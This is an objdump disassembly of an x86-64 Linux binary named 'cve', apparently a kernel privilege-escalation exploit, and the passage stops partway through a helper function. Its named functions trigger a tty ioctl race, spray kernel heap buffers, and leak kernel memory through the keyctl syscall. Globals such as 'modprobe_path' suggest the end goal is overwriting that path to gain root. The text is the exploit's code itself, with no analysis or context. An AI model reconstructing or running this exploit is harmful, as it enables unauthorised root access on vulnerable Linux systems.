
cve:     file format elf64-x86-64


Disassembly of section .init:

0000000000400b48 <_init>:
  400b48:	48 83 ec 08          	sub    $0x8,%rsp
  400b4c:	48 8b 05 a5 24 20 00 	mov    0x2024a5(%rip),%rax        # 602ff8 <__gmon_start__>
  400b53:	48 85 c0             	test   %rax,%rax
  400b56:	74 05                	je     400b5d <_init+0x15>
  400b58:	e8 43 01 00 00       	callq  400ca0 <__gmon_start__@plt>
  400b5d:	48 83 c4 08          	add    $0x8,%rsp
  400b61:	c3                   	retq   

Disassembly of section .plt:

0000000000400b70 <.plt>:
  400b70:	ff 35 92 24 20 00    	pushq  0x202492(%rip)        # 603008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400b76:	ff 25 94 24 20 00    	jmpq   *0x202494(%rip)        # 603010 <_GLOBAL_OFFSET_TABLE_+0x10>
  400b7c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400b80 <pthread_create@plt>:
  400b80:	ff 25 92 24 20 00    	jmpq   *0x202492(%rip)        # 603018 <pthread_create@GLIBC_2.2.5>
  400b86:	68 00 00 00 00       	pushq  $0x0
  400b8b:	e9 e0 ff ff ff       	jmpq   400b70 <.plt>

0000000000400b90 <__errno_location@plt>:
  400b90:	ff 25 8a 24 20 00    	jmpq   *0x20248a(%rip)        # 603020 <__errno_location@GLIBC_2.2.5>
  400b96:	68 01 00 00 00       	pushq  $0x1
  400b9b:	e9 d0 ff ff ff       	jmpq   400b70 <.plt>

0000000000400ba0 <sendmsg@plt>:
  400ba0:	ff 25 82 24 20 00    	jmpq   *0x202482(%rip)        # 603028 <sendmsg@GLIBC_2.2.5>
  400ba6:	68 02 00 00 00       	pushq  $0x2
  400bab:	e9 c0 ff ff ff       	jmpq   400b70 <.plt>

0000000000400bb0 <puts@plt>:
  400bb0:	ff 25 7a 24 20 00    	jmpq   *0x20247a(%rip)        # 603030 <puts@GLIBC_2.2.5>
  400bb6:	68 03 00 00 00       	pushq  $0x3
  400bbb:	e9 b0 ff ff ff       	jmpq   400b70 <.plt>

0000000000400bc0 <write@plt>:
  400bc0:	ff 25 72 24 20 00    	jmpq   *0x202472(%rip)        # 603038 <write@GLIBC_2.2.5>
  400bc6:	68 04 00 00 00       	pushq  $0x4
  400bcb:	e9 a0 ff ff ff       	jmpq   400b70 <.plt>

0000000000400bd0 <__stack_chk_fail@plt>:
  400bd0:	ff 25 6a 24 20 00    	jmpq   *0x20246a(%rip)        # 603040 <__stack_chk_fail@GLIBC_2.4>
  400bd6:	68 05 00 00 00       	pushq  $0x5
  400bdb:	e9 90 ff ff ff       	jmpq   400b70 <.plt>

0000000000400be0 <getuid@plt>:
  400be0:	ff 25 62 24 20 00    	jmpq   *0x202462(%rip)        # 603048 <getuid@GLIBC_2.2.5>
  400be6:	68 06 00 00 00       	pushq  $0x6
  400beb:	e9 80 ff ff ff       	jmpq   400b70 <.plt>

0000000000400bf0 <htons@plt>:
  400bf0:	ff 25 5a 24 20 00    	jmpq   *0x20245a(%rip)        # 603050 <htons@GLIBC_2.2.5>
  400bf6:	68 07 00 00 00       	pushq  $0x7
  400bfb:	e9 70 ff ff ff       	jmpq   400b70 <.plt>

0000000000400c00 <printf@plt>:
  400c00:	ff 25 52 24 20 00    	jmpq   *0x202452(%rip)        # 603058 <printf@GLIBC_2.2.5>
  400c06:	68 08 00 00 00       	pushq  $0x8
  400c0b:	e9 60 ff ff ff       	jmpq   400b70 <.plt>

0000000000400c10 <htonl@plt>:
  400c10:	ff 25 4a 24 20 00    	jmpq   *0x20244a(%rip)        # 603060 <htonl@GLIBC_2.2.5>
  400c16:	68 09 00 00 00       	pushq  $0x9
  400c1b:	e9 50 ff ff ff       	jmpq   400b70 <.plt>

0000000000400c20 <memset@plt>:
  400c20:	ff 25 42 24 20 00    	jmpq   *0x202442(%rip)        # 603068 <memset@GLIBC_2.2.5>
  400c26:	68 0a 00 00 00       	pushq  $0xa
  400c2b:	e9 40 ff ff ff       	jmpq   400b70 <.plt>

0000000000400c30 <ioctl@plt>:
  400c30:	ff 25 3a 24 20 00    	jmpq   *0x20243a(%rip)        # 603070 <ioctl@GLIBC_2.2.5>
  400c36:	68 0b 00 00 00       	pushq  $0xb
  400c3b:	e9 30 ff ff ff       	jmpq   400b70 <.plt>

0000000000400c40 <close@plt>:
  400c40:	ff 25 32 24 20 00    	jmpq   *0x202432(%rip)        # 603078 <close@GLIBC_2.2.5>
  400c46:	68 0c 00 00 00       	pushq  $0xc
  400c4b:	e9 20 ff ff ff       	jmpq   400b70 <.plt>

0000000000400c50 <read@plt>:
  400c50:	ff 25 2a 24 20 00    	jmpq   *0x20242a(%rip)        # 603080 <read@GLIBC_2.2.5>
  400c56:	68 0d 00 00 00       	pushq  $0xd
  400c5b:	e9 10 ff ff ff       	jmpq   400b70 <.plt>

0000000000400c60 <__libc_start_main@plt>:
  400c60:	ff 25 22 24 20 00    	jmpq   *0x202422(%rip)        # 603088 <__libc_start_main@GLIBC_2.2.5>
  400c66:	68 0e 00 00 00       	pushq  $0xe
  400c6b:	e9 00 ff ff ff       	jmpq   400b70 <.plt>

0000000000400c70 <strcmp@plt>:
  400c70:	ff 25 1a 24 20 00    	jmpq   *0x20241a(%rip)        # 603090 <strcmp@GLIBC_2.2.5>
  400c76:	68 0f 00 00 00       	pushq  $0xf
  400c7b:	e9 f0 fe ff ff       	jmpq   400b70 <.plt>

0000000000400c80 <fprintf@plt>:
  400c80:	ff 25 12 24 20 00    	jmpq   *0x202412(%rip)        # 603098 <fprintf@GLIBC_2.2.5>
  400c86:	68 10 00 00 00       	pushq  $0x10
  400c8b:	e9 e0 fe ff ff       	jmpq   400b70 <.plt>

0000000000400c90 <syscall@plt>:
  400c90:	ff 25 0a 24 20 00    	jmpq   *0x20240a(%rip)        # 6030a0 <syscall@GLIBC_2.2.5>
  400c96:	68 11 00 00 00       	pushq  $0x11
  400c9b:	e9 d0 fe ff ff       	jmpq   400b70 <.plt>

0000000000400ca0 <__gmon_start__@plt>:
  400ca0:	ff 25 02 24 20 00    	jmpq   *0x202402(%rip)        # 6030a8 <__gmon_start__>
  400ca6:	68 12 00 00 00       	pushq  $0x12
  400cab:	e9 c0 fe ff ff       	jmpq   400b70 <.plt>

0000000000400cb0 <inet_aton@plt>:
  400cb0:	ff 25 fa 23 20 00    	jmpq   *0x2023fa(%rip)        # 6030b0 <inet_aton@GLIBC_2.2.5>
  400cb6:	68 13 00 00 00       	pushq  $0x13
  400cbb:	e9 b0 fe ff ff       	jmpq   400b70 <.plt>

0000000000400cc0 <bind@plt>:
  400cc0:	ff 25 f2 23 20 00    	jmpq   *0x2023f2(%rip)        # 6030b8 <bind@GLIBC_2.2.5>
  400cc6:	68 14 00 00 00       	pushq  $0x14
  400ccb:	e9 a0 fe ff ff       	jmpq   400b70 <.plt>

0000000000400cd0 <open@plt>:
  400cd0:	ff 25 ea 23 20 00    	jmpq   *0x2023ea(%rip)        # 6030c0 <open@GLIBC_2.2.5>
  400cd6:	68 15 00 00 00       	pushq  $0x15
  400cdb:	e9 90 fe ff ff       	jmpq   400b70 <.plt>

0000000000400ce0 <perror@plt>:
  400ce0:	ff 25 e2 23 20 00    	jmpq   *0x2023e2(%rip)        # 6030c8 <perror@GLIBC_2.2.5>
  400ce6:	68 16 00 00 00       	pushq  $0x16
  400ceb:	e9 80 fe ff ff       	jmpq   400b70 <.plt>

0000000000400cf0 <pthread_join@plt>:
  400cf0:	ff 25 da 23 20 00    	jmpq   *0x2023da(%rip)        # 6030d0 <pthread_join@GLIBC_2.2.5>
  400cf6:	68 17 00 00 00       	pushq  $0x17
  400cfb:	e9 70 fe ff ff       	jmpq   400b70 <.plt>

0000000000400d00 <exit@plt>:
  400d00:	ff 25 d2 23 20 00    	jmpq   *0x2023d2(%rip)        # 6030d8 <exit@GLIBC_2.2.5>
  400d06:	68 18 00 00 00       	pushq  $0x18
  400d0b:	e9 60 fe ff ff       	jmpq   400b70 <.plt>

0000000000400d10 <fwrite@plt>:
  400d10:	ff 25 ca 23 20 00    	jmpq   *0x2023ca(%rip)        # 6030e0 <fwrite@GLIBC_2.2.5>
  400d16:	68 19 00 00 00       	pushq  $0x19
  400d1b:	e9 50 fe ff ff       	jmpq   400b70 <.plt>

0000000000400d20 <getrlimit@plt>:
  400d20:	ff 25 c2 23 20 00    	jmpq   *0x2023c2(%rip)        # 6030e8 <getrlimit@GLIBC_2.2.5>
  400d26:	68 1a 00 00 00       	pushq  $0x1a
  400d2b:	e9 40 fe ff ff       	jmpq   400b70 <.plt>

0000000000400d30 <execl@plt>:
  400d30:	ff 25 ba 23 20 00    	jmpq   *0x2023ba(%rip)        # 6030f0 <execl@GLIBC_2.2.5>
  400d36:	68 1b 00 00 00       	pushq  $0x1b
  400d3b:	e9 30 fe ff ff       	jmpq   400b70 <.plt>

0000000000400d40 <sleep@plt>:
  400d40:	ff 25 b2 23 20 00    	jmpq   *0x2023b2(%rip)        # 6030f8 <sleep@GLIBC_2.2.5>
  400d46:	68 1c 00 00 00       	pushq  $0x1c
  400d4b:	e9 20 fe ff ff       	jmpq   400b70 <.plt>

0000000000400d50 <usleep@plt>:
  400d50:	ff 25 aa 23 20 00    	jmpq   *0x2023aa(%rip)        # 603100 <usleep@GLIBC_2.2.5>
  400d56:	68 1d 00 00 00       	pushq  $0x1d
  400d5b:	e9 10 fe ff ff       	jmpq   400b70 <.plt>

0000000000400d60 <socket@plt>:
  400d60:	ff 25 a2 23 20 00    	jmpq   *0x2023a2(%rip)        # 603108 <socket@GLIBC_2.2.5>
  400d66:	68 1e 00 00 00       	pushq  $0x1e
  400d6b:	e9 00 fe ff ff       	jmpq   400b70 <.plt>

Disassembly of section .text:

0000000000400d70 <_start>:
  400d70:	31 ed                	xor    %ebp,%ebp
  400d72:	49 89 d1             	mov    %rdx,%r9
  400d75:	5e                   	pop    %rsi
  400d76:	48 89 e2             	mov    %rsp,%rdx
  400d79:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  400d7d:	50                   	push   %rax
  400d7e:	54                   	push   %rsp
  400d7f:	49 c7 c0 50 24 40 00 	mov    $0x402450,%r8
  400d86:	48 c7 c1 e0 23 40 00 	mov    $0x4023e0,%rcx
  400d8d:	48 c7 c7 20 22 40 00 	mov    $0x402220,%rdi
  400d94:	e8 c7 fe ff ff       	callq  400c60 <__libc_start_main@plt>
  400d99:	f4                   	hlt    
  400d9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400da0 <deregister_tm_clones>:
  400da0:	b8 f7 32 60 00       	mov    $0x6032f7,%eax
  400da5:	55                   	push   %rbp
  400da6:	48 2d f0 32 60 00    	sub    $0x6032f0,%rax
  400dac:	48 83 f8 0e          	cmp    $0xe,%rax
  400db0:	48 89 e5             	mov    %rsp,%rbp
  400db3:	77 02                	ja     400db7 <deregister_tm_clones+0x17>
  400db5:	5d                   	pop    %rbp
  400db6:	c3                   	retq   
  400db7:	b8 00 00 00 00       	mov    $0x0,%eax
  400dbc:	48 85 c0             	test   %rax,%rax
  400dbf:	74 f4                	je     400db5 <deregister_tm_clones+0x15>
  400dc1:	5d                   	pop    %rbp
  400dc2:	bf f0 32 60 00       	mov    $0x6032f0,%edi
  400dc7:	ff e0                	jmpq   *%rax
  400dc9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400dd0 <register_tm_clones>:
  400dd0:	b8 f0 32 60 00       	mov    $0x6032f0,%eax
  400dd5:	55                   	push   %rbp
  400dd6:	48 2d f0 32 60 00    	sub    $0x6032f0,%rax
  400ddc:	48 c1 f8 03          	sar    $0x3,%rax
  400de0:	48 89 e5             	mov    %rsp,%rbp
  400de3:	48 89 c2             	mov    %rax,%rdx
  400de6:	48 c1 ea 3f          	shr    $0x3f,%rdx
  400dea:	48 01 d0             	add    %rdx,%rax
  400ded:	48 d1 f8             	sar    %rax
  400df0:	75 02                	jne    400df4 <register_tm_clones+0x24>
  400df2:	5d                   	pop    %rbp
  400df3:	c3                   	retq   
  400df4:	ba 00 00 00 00       	mov    $0x0,%edx
  400df9:	48 85 d2             	test   %rdx,%rdx
  400dfc:	74 f4                	je     400df2 <register_tm_clones+0x22>
  400dfe:	5d                   	pop    %rbp
  400dff:	48 89 c6             	mov    %rax,%rsi
  400e02:	bf f0 32 60 00       	mov    $0x6032f0,%edi
  400e07:	ff e2                	jmpq   *%rdx
  400e09:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400e10 <__do_global_dtors_aux>:
  400e10:	80 3d f1 24 20 00 00 	cmpb   $0x0,0x2024f1(%rip)        # 603308 <completed.6982>
  400e17:	75 11                	jne    400e2a <__do_global_dtors_aux+0x1a>
  400e19:	55                   	push   %rbp
  400e1a:	48 89 e5             	mov    %rsp,%rbp
  400e1d:	e8 7e ff ff ff       	callq  400da0 <deregister_tm_clones>
  400e22:	5d                   	pop    %rbp
  400e23:	c6 05 de 24 20 00 01 	movb   $0x1,0x2024de(%rip)        # 603308 <completed.6982>
  400e2a:	f3 c3                	repz retq 
  400e2c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400e30 <frame_dummy>:
  400e30:	48 83 3d d8 1f 20 00 	cmpq   $0x0,0x201fd8(%rip)        # 602e10 <__JCR_END__>
  400e37:	00 
  400e38:	74 1e                	je     400e58 <frame_dummy+0x28>
  400e3a:	b8 00 00 00 00       	mov    $0x0,%eax
  400e3f:	48 85 c0             	test   %rax,%rax
  400e42:	74 14                	je     400e58 <frame_dummy+0x28>
  400e44:	55                   	push   %rbp
  400e45:	bf 10 2e 60 00       	mov    $0x602e10,%edi
  400e4a:	48 89 e5             	mov    %rsp,%rbp
  400e4d:	ff d0                	callq  *%rax
  400e4f:	5d                   	pop    %rbp
  400e50:	e9 7b ff ff ff       	jmpq   400dd0 <register_tm_clones>
  400e55:	0f 1f 00             	nopl   (%rax)
  400e58:	e9 73 ff ff ff       	jmpq   400dd0 <register_tm_clones>

0000000000400e5d <race_on>:
  400e5d:	55                   	push   %rbp
  400e5e:	48 89 e5             	mov    %rsp,%rbp
  400e61:	48 83 ec 20          	sub    $0x20,%rsp
  400e65:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  400e69:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  400e6d:	89 45 f8             	mov    %eax,-0x8(%rbp)
  400e70:	8b 45 f8             	mov    -0x8(%rbp),%eax
  400e73:	ba 01 00 00 00       	mov    $0x1,%edx
  400e78:	be 0a 54 00 00       	mov    $0x540a,%esi
  400e7d:	89 c7                	mov    %eax,%edi
  400e7f:	b8 00 00 00 00       	mov    $0x0,%eax
  400e84:	e8 a7 fd ff ff       	callq  400c30 <ioctl@plt>
  400e89:	89 45 fc             	mov    %eax,-0x4(%rbp)
  400e8c:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%rbp)
  400e90:	75 13                	jne    400ea5 <race_on+0x48>
  400e92:	bf 64 24 40 00       	mov    $0x402464,%edi
  400e97:	e8 44 fe ff ff       	callq  400ce0 <perror@plt>
  400e9c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  400ea3:	eb 05                	jmp    400eaa <race_on+0x4d>
  400ea5:	b8 00 00 00 00       	mov    $0x0,%eax
  400eaa:	c9                   	leaveq 
  400eab:	c3                   	retq   

0000000000400eac <race_flush>:
  400eac:	55                   	push   %rbp
  400ead:	48 89 e5             	mov    %rsp,%rbp
  400eb0:	48 83 ec 20          	sub    $0x20,%rsp
  400eb4:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  400eb8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  400ebc:	89 45 f8             	mov    %eax,-0x8(%rbp)
  400ebf:	8b 45 f8             	mov    -0x8(%rbp),%eax
  400ec2:	ba 02 00 00 00       	mov    $0x2,%edx
  400ec7:	be 0b 54 00 00       	mov    $0x540b,%esi
  400ecc:	89 c7                	mov    %eax,%edi
  400ece:	b8 00 00 00 00       	mov    $0x0,%eax
  400ed3:	e8 58 fd ff ff       	callq  400c30 <ioctl@plt>
  400ed8:	89 45 fc             	mov    %eax,-0x4(%rbp)
  400edb:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%rbp)
  400edf:	75 13                	jne    400ef4 <race_flush+0x48>
  400ee1:	bf 64 24 40 00       	mov    $0x402464,%edi
  400ee6:	e8 f5 fd ff ff       	callq  400ce0 <perror@plt>
  400eeb:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  400ef2:	eb 05                	jmp    400ef9 <race_flush+0x4d>
  400ef4:	b8 00 00 00 00       	mov    $0x0,%eax
  400ef9:	c9                   	leaveq 
  400efa:	c3                   	retq   

0000000000400efb <init_buf_spray>:
  400efb:	55                   	push   %rbp
  400efc:	48 89 e5             	mov    %rsp,%rbp
  400eff:	48 83 ec 10          	sub    $0x10,%rsp
  400f03:	48 c7 45 f8 60 63 60 	movq   $0x606360,-0x8(%rbp)
  400f0a:	00 
  400f0b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f0f:	ba 10 00 00 00       	mov    $0x10,%edx
  400f14:	be 00 00 00 00       	mov    $0x0,%esi
  400f19:	48 89 c7             	mov    %rax,%rdi
  400f1c:	e8 ff fc ff ff       	callq  400c20 <memset@plt>
  400f21:	48 8b 15 80 23 20 00 	mov    0x202380(%rip),%rdx        # 6032a8 <search_addr_base>
  400f28:	48 8b 05 b1 23 20 00 	mov    0x2023b1(%rip),%rax        # 6032e0 <search_offs>
  400f2f:	48 01 d0             	add    %rdx,%rax
  400f32:	48 89 c2             	mov    %rax,%rdx
  400f35:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f39:	48 89 50 18          	mov    %rdx,0x18(%rax)
  400f3d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f41:	48 8b 40 18          	mov    0x18(%rax),%rax
  400f45:	48 8d 50 12          	lea    0x12(%rax),%rdx
  400f49:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f4d:	48 89 50 10          	mov    %rdx,0x10(%rax)
  400f51:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f55:	48 8b 40 18          	mov    0x18(%rax),%rax
  400f59:	48 8d 50 0d          	lea    0xd(%rax),%rdx
  400f5d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f61:	48 89 50 20          	mov    %rdx,0x20(%rax)
  400f65:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f69:	48 c7 40 28 00 00 00 	movq   $0x0,0x28(%rax)
  400f70:	00 
  400f71:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f75:	48 c7 40 30 00 00 00 	movq   $0x0,0x30(%rax)
  400f7c:	00 
  400f7d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f81:	66 c7 40 38 00 80    	movw   $0x8000,0x38(%rax)
  400f87:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f8b:	66 c7 40 3a 00 80    	movw   $0x8000,0x3a(%rax)
  400f91:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f95:	66 c7 40 3c 00 80    	movw   $0x8000,0x3c(%rax)
  400f9b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400f9f:	66 c7 40 3e 10 00    	movw   $0x10,0x3e(%rax)
  400fa5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400fa9:	48 c7 40 40 00 00 00 	movq   $0x0,0x40(%rax)
  400fb0:	00 
  400fb1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400fb5:	48 83 c0 48          	add    $0x48,%rax
  400fb9:	48 8b 15 00 23 20 00 	mov    0x202300(%rip),%rdx        # 6032c0 <search_key>
  400fc0:	48 89 10             	mov    %rdx,(%rax)
  400fc3:	48 8b 15 fe 22 20 00 	mov    0x2022fe(%rip),%rdx        # 6032c8 <search_key+0x8>
  400fca:	48 89 50 08          	mov    %rdx,0x8(%rax)
  400fce:	48 8b 15 fb 22 20 00 	mov    0x2022fb(%rip),%rdx        # 6032d0 <search_key+0x10>
  400fd5:	48 89 50 10          	mov    %rdx,0x10(%rax)
  400fd9:	0f b7 15 f8 22 20 00 	movzwl 0x2022f8(%rip),%edx        # 6032d8 <search_key+0x18>
  400fe0:	66 89 50 18          	mov    %dx,0x18(%rax)
  400fe4:	c9                   	leaveq 
  400fe5:	c3                   	retq   

0000000000400fe6 <buf_spray_inc>:
  400fe6:	55                   	push   %rbp
  400fe7:	48 89 e5             	mov    %rsp,%rbp
  400fea:	48 83 ec 10          	sub    $0x10,%rsp
  400fee:	48 c7 45 f8 60 63 60 	movq   $0x606360,-0x8(%rbp)
  400ff5:	00 
  400ff6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400ffa:	48 8b 50 18          	mov    0x18(%rax),%rdx
  400ffe:	48 8b 05 ab 22 20 00 	mov    0x2022ab(%rip),%rax        # 6032b0 <addr_inc>
  401005:	48 01 c2             	add    %rax,%rdx
  401008:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40100c:	48 89 50 18          	mov    %rdx,0x18(%rax)
  401010:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401014:	48 8b 40 18          	mov    0x18(%rax),%rax
  401018:	48 8d 50 12          	lea    0x12(%rax),%rdx
  40101c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401020:	48 89 50 10          	mov    %rdx,0x10(%rax)
  401024:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401028:	48 8b 40 18          	mov    0x18(%rax),%rax
  40102c:	48 8d 50 0d          	lea    0xd(%rax),%rdx
  401030:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401034:	48 89 50 20          	mov    %rdx,0x20(%rax)
  401038:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40103c:	48 8b 40 18          	mov    0x18(%rax),%rax
  401040:	48 89 c6             	mov    %rax,%rsi
  401043:	bf a8 24 40 00       	mov    $0x4024a8,%edi
  401048:	b8 00 00 00 00       	mov    $0x0,%eax
  40104d:	e8 ae fb ff ff       	callq  400c00 <printf@plt>
  401052:	c9                   	leaveq 
  401053:	c3                   	retq   

0000000000401054 <get_addr_info>:
  401054:	55                   	push   %rbp
  401055:	48 89 e5             	mov    %rsp,%rbp
  401058:	48 83 ec 40          	sub    $0x40,%rsp
  40105c:	89 7d ec             	mov    %edi,-0x14(%rbp)
  40105f:	89 75 e8             	mov    %esi,-0x18(%rbp)
  401062:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
  401066:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
  40106a:	4c 89 45 d0          	mov    %r8,-0x30(%rbp)
  40106e:	4c 89 4d c8          	mov    %r9,-0x38(%rbp)
  401072:	48 c7 45 f8 60 63 60 	movq   $0x606360,-0x8(%rbp)
  401079:	00 
  40107a:	48 8b 15 9f 22 20 00 	mov    0x20229f(%rip),%rdx        # 603320 <real_format>
  401081:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401085:	48 89 50 10          	mov    %rdx,0x10(%rax)
  401089:	48 8b 15 58 22 20 00 	mov    0x202258(%rip),%rdx        # 6032e8 <modprobe_path>
  401090:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401094:	48 89 50 20          	mov    %rdx,0x20(%rax)
  401098:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40109c:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  4010a0:	48 89 50 28          	mov    %rdx,0x28(%rax)
  4010a4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4010a8:	48 c7 40 30 00 00 00 	movq   $0x0,0x30(%rax)
  4010af:	00 
  4010b0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4010b4:	8d 14 00             	lea    (%rax,%rax,1),%edx
  4010b7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4010bb:	66 89 50 38          	mov    %dx,0x38(%rax)
  4010bf:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4010c3:	66 c7 40 3a 00 00    	movw   $0x0,0x3a(%rax)
  4010c9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4010cd:	66 c7 40 3c 00 01    	movw   $0x100,0x3c(%rax)
  4010d3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4010d7:	66 c7 40 3e 10 00    	movw   $0x10,0x3e(%rax)
  4010dd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4010e1:	48 c7 40 40 00 00 00 	movq   $0x0,0x40(%rax)
  4010e8:	00 
  4010e9:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4010ec:	ba 04 10 00 00       	mov    $0x1004,%edx
  4010f1:	be 60 63 60 00       	mov    $0x606360,%esi
  4010f6:	89 c7                	mov    %eax,%edi
  4010f8:	e8 c3 fa ff ff       	callq  400bc0 <write@plt>
  4010fd:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
  401101:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  401105:	8b 45 e8             	mov    -0x18(%rbp),%eax
  401108:	49 89 c8             	mov    %rcx,%r8
  40110b:	48 89 d1             	mov    %rdx,%rcx
  40110e:	89 c2                	mov    %eax,%edx
  401110:	be 0b 00 00 00       	mov    $0xb,%esi
  401115:	bf fa 00 00 00       	mov    $0xfa,%edi
  40111a:	b8 00 00 00 00       	mov    $0x0,%eax
  40111f:	e8 6c fb ff ff       	callq  400c90 <syscall@plt>
  401124:	89 45 f4             	mov    %eax,-0xc(%rbp)
  401127:	83 7d f4 ff          	cmpl   $0xffffffff,-0xc(%rbp)
  40112b:	74 0b                	je     401138 <get_addr_info+0xe4>
  40112d:	8b 45 f4             	mov    -0xc(%rbp),%eax
  401130:	48 98                	cltq   
  401132:	48 3b 45 c8          	cmp    -0x38(%rbp),%rax
  401136:	76 11                	jbe    401149 <get_addr_info+0xf5>
  401138:	bf b7 24 40 00       	mov    $0x4024b7,%edi
  40113d:	e8 9e fb ff ff       	callq  400ce0 <perror@plt>
  401142:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401147:	eb 05                	jmp    40114e <get_addr_info+0xfa>
  401149:	b8 00 00 00 00       	mov    $0x0,%eax
  40114e:	c9                   	leaveq 
  40114f:	c3                   	retq   

0000000000401150 <hex_to_char>:
  401150:	55                   	push   %rbp
  401151:	48 89 e5             	mov    %rsp,%rbp
  401154:	48 83 ec 20          	sub    $0x20,%rsp
  401158:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  40115c:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  401160:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401164:	0f b6 00             	movzbl (%rax),%eax
  401167:	88 45 f0             	mov    %al,-0x10(%rbp)
  40116a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40116e:	0f b6 40 01          	movzbl 0x1(%rax),%eax
  401172:	88 45 f1             	mov    %al,-0xf(%rbp)
  401175:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  40117c:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  401180:	3c 2f                	cmp    $0x2f,%al
  401182:	7e 1a                	jle    40119e <hex_to_char+0x4e>
  401184:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  401188:	3c 39                	cmp    $0x39,%al
  40118a:	7f 12                	jg     40119e <hex_to_char+0x4e>
  40118c:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  401190:	0f be c0             	movsbl %al,%eax
  401193:	83 e8 30             	sub    $0x30,%eax
  401196:	c1 e0 04             	shl    $0x4,%eax
  401199:	01 45 fc             	add    %eax,-0x4(%rbp)
  40119c:	eb 73                	jmp    401211 <hex_to_char+0xc1>
  40119e:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  4011a2:	3c 40                	cmp    $0x40,%al
  4011a4:	7e 1a                	jle    4011c0 <hex_to_char+0x70>
  4011a6:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  4011aa:	3c 46                	cmp    $0x46,%al
  4011ac:	7f 12                	jg     4011c0 <hex_to_char+0x70>
  4011ae:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  4011b2:	0f be c0             	movsbl %al,%eax
  4011b5:	83 e8 37             	sub    $0x37,%eax
  4011b8:	c1 e0 04             	shl    $0x4,%eax
  4011bb:	01 45 fc             	add    %eax,-0x4(%rbp)
  4011be:	eb 51                	jmp    401211 <hex_to_char+0xc1>
  4011c0:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  4011c4:	3c 60                	cmp    $0x60,%al
  4011c6:	7e 1a                	jle    4011e2 <hex_to_char+0x92>
  4011c8:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  4011cc:	3c 66                	cmp    $0x66,%al
  4011ce:	7f 12                	jg     4011e2 <hex_to_char+0x92>
  4011d0:	0f b6 45 f0          	movzbl -0x10(%rbp),%eax
  4011d4:	0f be c0             	movsbl %al,%eax
  4011d7:	83 e8 57             	sub    $0x57,%eax
  4011da:	c1 e0 04             	shl    $0x4,%eax
  4011dd:	01 45 fc             	add    %eax,-0x4(%rbp)
  4011e0:	eb 2f                	jmp    401211 <hex_to_char+0xc1>
  4011e2:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  4011e9:	48 8b 05 10 21 20 00 	mov    0x202110(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  4011f0:	48 89 c1             	mov    %rax,%rcx
  4011f3:	ba 0b 00 00 00       	mov    $0xb,%edx
  4011f8:	be 01 00 00 00       	mov    $0x1,%esi
  4011fd:	bf c3 24 40 00       	mov    $0x4024c3,%edi
  401202:	e8 09 fb ff ff       	callq  400d10 <fwrite@plt>
